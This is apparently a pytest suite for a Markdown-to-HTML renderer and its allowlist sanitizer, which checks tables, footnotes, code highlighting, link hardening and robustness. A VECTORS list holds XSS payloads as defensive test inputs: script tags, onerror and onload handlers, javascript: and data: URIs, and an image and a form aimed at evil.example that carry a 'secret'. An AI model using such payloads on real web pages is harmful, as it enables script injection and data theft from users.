"""Markdown rendering and the HTML allowlist, offline."""

import re
import time
from html.parser import HTMLParser

import pytest

from llm_harness.display import sanitize_text
from llm_harness.markdown_render import (
    parser_factory,
    pygments_css,
    render_html,
    sanitize_html,
)


def pipeline(text: str) -> str:
    """What the GUI does: sanitize_text, render, then the HTML sanitizer."""
    return sanitize_html(render_html(sanitize_text(text)))


# Every enabled extension renders


def test_commonmark_basics() -> None:
    html = render_html("# T\n\n*em* **strong** `code`\n\n> quote\n\n1. a\n2. b\n")
    for fragment in ("<h1>T</h1>", "<em>em</em>", "<strong>strong</strong>"):
        assert fragment in html
    for fragment in ("<code>code</code>", "<blockquote>", "<ol>"):
        assert fragment in html


def test_table() -> None:
    html = pipeline("| a | b |\n|---|---|\n| 1 | 2 |\n")
    assert "<table>" in html and "<th>a</th>" in html and "<td>2</td>" in html


def test_strikethrough() -> None:
    assert "<s>gone</s>" in pipeline("~~gone~~")


def test_task_list_has_disabled_checkboxes_only() -> None:
    html = pipeline("- [x] done\n- [ ] todo\n")
    inputs = re.findall(r"<input[^>]*>", html)
    assert len(inputs) == 2
    assert all('type="checkbox"' in i and "disabled" in i for i in inputs)
    assert 'checked="checked"' in inputs[0] and "checked" not in inputs[1]


def test_footnote_has_a_section_with_fragment_links() -> None:
    html = pipeline("Text[^1].\n\n[^1]: The note.\n")
    assert '<section class="footnotes">' in html
    assert 'href="#fn1"' in html and 'href="#fnref1"' in html
    assert 'id="fn1"' in html and 'id="fnref1"' in html
    assert "The note." in html


def test_fenced_code_is_highlighted() -> None:
    html = pipeline('```python\nx = "a<b"\n```\n')
    assert '<pre><code class="language-python">' in html
    assert '<span class="n">x</span>' in html
    assert "&lt;b" in html


def test_unknown_fence_language_falls_back_to_escaped_plain_code() -> None:
    html = pipeline("```nosuchlang\n<i>x</i>\n```\n")
    assert "&lt;i&gt;x&lt;/i&gt;" in html and "<span" not in html and "<i>" not in html


def test_fence_without_language_is_escaped_plain_code() -> None:
    assert "&lt;b&gt;" in pipeline("```\n<b>\n```\n")


def test_autolink() -> None:
    html = pipeline("see https://a.example/x and www.example.com")
    assert '<a href="https://a.example/x"' in html
    assert '<a href="http://www.example.com"' in html


def test_pygments_css_targets_the_container_class() -> None:
    css = pygments_css("llm-md")
    assert ".llm-md .k" in css


# Raw HTML is text


@pytest.mark.parametrize(
    ("source", "escaped"),
    [
        ("<b>x</b>", "&lt;b&gt;x&lt;/b&gt;"),
        ("<script>alert(1)</script>", "&lt;script&gt;alert(1)&lt;/script&gt;"),
    ],
)
def test_raw_html_is_shown_as_literal_text(source: str, escaped: str) -> None:
    assert render_html(source) == f"<p>{escaped}</p>\n"


def test_raw_html_block_is_shown_as_literal_text() -> None:
    html = render_html("<div>\n<b>x</b>\n</div>\n")
    assert "<div>" not in html and "&lt;div&gt;" in html


# XSS vectors through the full pipeline

VECTORS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "[x](javascript:alert(1))",
    "[x](JaVaScRiPt:alert(1))",
    "[x](&#106;avascript:alert(1))",
    "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "[x](vbscript:msgbox(1))",
    "![x](http://evil.example/p.png?q=secret)",
    "<iframe src=http://evil.example></iframe>",
    "<svg onload=alert(1)>",
    "<style>body{display:none}</style>",
    "<form action=http://evil.example><input name=q></form>",
    '<a href="javascript:alert(1)" onclick="alert(2)">x</a>',
    "javascript:alert(1)",
    "<javascript:alert(1)>",
    "```html\n<img src=x onerror=alert(1)>\n```",
    '[x](http://a.example "t\\" onmouseover=\\"alert(1)\\" <b>")',
    "[x](  javascript:alert(1))",
    "[x](//evil.example/x)",
    "[x](/relative/path)",
    "<object data=x></object><embed src=x><math><mi>x</mi></math>",
    '<div style="x:y" srcdoc="<script>alert(1)</script>">x</div>',
]
ALLOWED_TAGS = {
    "p",
    "br",
    "hr",
    "h1",
    "h2",
    "h3",
    "h4",
    "h5",
    "h6",
    "strong",
    "em",
    "s",
    "del",
    "code",
    "pre",
    "blockquote",
    "ul",
    "ol",
    "li",
    "input",
    "a",
    "table",
    "thead",
    "tbody",
    "tr",
    "th",
    "td",
    "sup",
    "section",
    "div",
    "span",
}
ALLOWED_ATTRIBUTES = {
    "class",
    "id",
    "href",
    "type",
    "checked",
    "disabled",
    "target",
    "rel",
}
SAFE_HREF = re.compile(r"(https?://|mailto:|#)")


class Collector(HTMLParser):
    def __init__(self) -> None:
        super().__init__()
        self.tags: set[str] = set()
        self.attributes: list[tuple[str, str, str | None]] = []

    def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
        self.tags.add(tag)
        self.attributes.extend((tag, name, value) for name, value in attrs)


def assert_only_allowlisted_markup(html: str) -> None:
    collector = Collector()
    collector.feed(html)
    assert collector.tags <= ALLOWED_TAGS, (collector.tags, html)
    for tag, name, value in collector.attributes:
        assert name in ALLOWED_ATTRIBUTES, (tag, name, html)
        if name == "href":
            assert SAFE_HREF.match(value or ""), (tag, value, html)
    assert "<!--" not in html


@pytest.mark.parametrize("source", VECTORS)
def test_xss_vector_leaves_only_allowlisted_markup(source: str) -> None:
    assert_only_allowlisted_markup(pipeline(source))


@pytest.mark.parametrize("source", VECTORS)
def test_xss_vector_produces_no_active_element(source: str) -> None:
    # Dangerous text may stay as escaped text; it must not become an element.
    html = pipeline(source)
    assert not re.search(
        r"<(script|img|iframe|svg|style|form|object|embed|math)\b", html
    )


def test_the_checker_itself_catches_unsafe_markup() -> None:
    for unsafe in (
        "<script>x</script>",
        '<a href="javascript:x">y</a>',
        '<p onclick="x">y</p>',
        '<img src="x">',
    ):
        with pytest.raises(AssertionError):
            assert_only_allowlisted_markup(unsafe)


def test_image_degrades_to_alt_text_without_an_img_element() -> None:
    html = pipeline("![the alt](http://evil.example/p.png?q=secret)")
    assert html == "<p>the alt</p>\n"
    assert "evil.example" not in html


def test_sanitizer_alone_removes_img_and_other_active_tags() -> None:
    html = sanitize_html(
        '<img src="http://evil.example/p.png" onerror="x">a'
        '<iframe src="x">b</iframe><svg onload="x">c</svg><script>d()</script>'
        '<style>e{}</style><form action="x"><input name="q"></form>'
    )
    assert not re.search(r"<(img|iframe|svg|script|style|form)\b", html)
    assert "evil.example" not in html and "d()" not in html and "e{}" not in html


def test_onerror_inside_a_fence_is_escaped() -> None:
    html = pipeline("```\n<img src=x onerror=alert(1)>\n```\n")
    assert "<img" not in html
    assert "&lt;img src=x onerror=alert(1)&gt;" in html


def test_link_title_with_quotes_and_angle_brackets_cannot_break_out() -> None:
    html = pipeline('[x](http://a.example "q\\" <b>x</b> onmouseover=\\"1")')
    assert "<b>" not in html
    assert re.findall(r"<a [^>]*>", html)
    assert " onmouseover" not in re.sub(r'"[^"]*"', "", html)


def test_title_and_lang_attributes_are_dropped() -> None:
    html = sanitize_html('<a href="https://a.example" title="t" lang="en">x</a>')
    assert "title" not in html and "lang" not in html


ANCHOR = re.compile(r"<a\b[^>]*>")


def test_remaining_links_are_only_safe_schemes_and_always_hardened() -> None:
    source = (
        "[a](http://a.example) [b](https://b.example) [c](mailto:me@a.example) "
        "[d](#fn1) [e](javascript:x) [f](/rel) [g](//h.example) [h](ftp://h.example) "
        "[i](file:///etc/passwd) [j](tel:123) auto https://k.example"
    )
    anchors = ANCHOR.findall(pipeline(source))
    assert anchors
    for anchor in anchors:
        href = re.search(r'href="([^"]*)"', anchor)
        if href is not None:
            assert re.match(r"(https?://|mailto:|#)", href.group(1)), anchor
        assert 'rel="noopener noreferrer"' in anchor, anchor
        if href is not None and not href.group(1).startswith("#"):
            assert 'target="_blank"' in anchor, anchor
        if href is not None and href.group(1).startswith("#"):
            assert "target" not in anchor, anchor
    hrefs = [m for a in anchors for m in re.findall(r'href="([^"]*)"', a)]
    assert hrefs == [
        "http://a.example",
        "https://b.example",
        "mailto:me@a.example",
        "#fn1",
        "https://k.example",
    ]


def test_fragment_link_has_rel_and_no_target() -> None:
    html = sanitize_html('<a href="#fn1" target="_blank">x</a>')
    assert html == '<a href="#fn1" rel="noopener noreferrer">x</a>'


@pytest.mark.parametrize(
    "url", ["http://a.example", "https://a.example", "mailto:a@b.c"]
)
def test_external_link_has_rel_and_target(url: str) -> None:
    html = sanitize_html(f'<a href="{url}">x</a>')
    assert 'rel="noopener noreferrer"' in html and 'target="_blank"' in html


def test_a_link_with_a_dropped_href_is_left_as_is() -> None:
    html = sanitize_html('<a href="javascript:x">x</a>')
    assert "href" not in html and 'rel="noopener noreferrer"' in html


def test_footnote_markdown_gives_fragment_links_without_target() -> None:
    html = pipeline("Text[^1].\n\n[^1]: The note.\n")
    anchors = ANCHOR.findall(html)
    assert len(anchors) == 2
    for anchor in anchors:
        assert 'href="#fn' in anchor and "target" not in anchor, anchor
        assert 'rel="noopener noreferrer"' in anchor


@pytest.mark.parametrize(
    "source",
    [
        "[a](#fn1)",
        "[a](https://a.example) [b](#x)",
        "[a](/relative) [b](javascript:x) [c](#y) [d](mailto:a@b.c)",
        "Text[^1].\n\n[^1]: n\n",
    ],
)
def test_sanitizer_is_idempotent_for_fragment_external_and_dropped_links(
    source: str,
) -> None:
    once = pipeline(source)
    assert sanitize_html(once) == once


def test_sanitizer_overrides_attacker_rel_and_target() -> None:
    html = sanitize_html('<a href="https://a.example" rel="opener" target="_top">x</a>')
    assert 'rel="noopener noreferrer"' in html
    assert 'target="_blank"' in html and "_top" not in html and 'opener"' not in html


def test_sanitizer_keeps_only_footnote_ids_and_safe_classes() -> None:
    html = sanitize_html(
        '<a href="#x" id="body">a</a><a id="fnref1">b</a>'
        '<span class="k" id="fn1">c</span><span class="a b&quot;c">d</span>'
        '<p class="k">e</p>'
    )
    assert 'id="body"' not in html and 'id="fnref1"' in html
    assert 'id="fn1"' not in html  # id only on a and li
    assert '<span class="k">c</span>' in html and "b&quot;c" not in html
    assert "<p>e</p>" in html


def test_checkbox_input_cannot_become_enabled_or_another_type() -> None:
    html = sanitize_html(
        '<input type="text" value="x" name="n"><input type="checkbox">'
    )
    assert 'type="text"' not in html and "value" not in html and "name" not in html
    assert html.count("disabled") == 2


@pytest.mark.parametrize("source", VECTORS)
def test_sanitizer_is_idempotent(source: str) -> None:
    once = pipeline(source)
    assert sanitize_html(once) == once


def test_sanitizer_is_idempotent_on_a_rich_document() -> None:
    once = pipeline(
        "# T\n\n| a |\n|---|\n| 1 |\n\n- [x] t\n\nF[^1]\n\n[^1]: n\n\n```python\nx=1\n```\n"
    )
    assert sanitize_html(once) == once


# Robustness


@pytest.mark.parametrize(
    "source",
    [
        "```python\nx = ",
        "~~~\n",
        "| a | b |\n|---|",
        "| a | b |\n|---|---|\n| 1 |",
        "**bold and *it",
        "[x](http://a",
        "[^1]",
        "- [ ",
        "![alt",
        "",
        "\n\n\n",
    ],
)
def test_unfinished_markdown_does_not_raise(source: str) -> None:
    pipeline(source)
    parser_factory().parse(source)


def test_a_200_kb_input_renders_in_well_under_a_second() -> None:
    prose = (
        "Some **bold** text with a [link](https://a.example) and `code`.\n\n" * 3200
    )[:200_000]
    code = "```python\n" + "x = 1  # <b>\n" * 16000 + "```\n"
    table = "| a | b |\n|---|---|\n" + "| 1 | 2 |\n" * 20000
    for text in (prose, code, table):
        started = time.perf_counter()
        pipeline(text)
        assert time.perf_counter() - started < 1.0, text[:20]


# Composition with sanitize_text


def test_control_characters_and_bidi_overrides_are_gone_before_rendering() -> None:
    html = pipeline("**a\x1b[31mb\x07**\u202ec\u2066d\x9be")
    assert html == "<p><strong>a[31mb</strong>cde</p>\n"


@pytest.mark.parametrize(
    "text",
    [
        "می\u200cخواهم",  # Persian with ZWNJ
        "مرحبا بالعالم",  # Arabic
        "日本語のテキスト",  # Japanese
        "👩\u200d👩\u200d👧 family",  # emoji ZWJ sequence
    ],
)
def test_international_text_passes_through_unchanged(text: str) -> None:
    assert pipeline(text) == f"<p>{text}</p>\n"
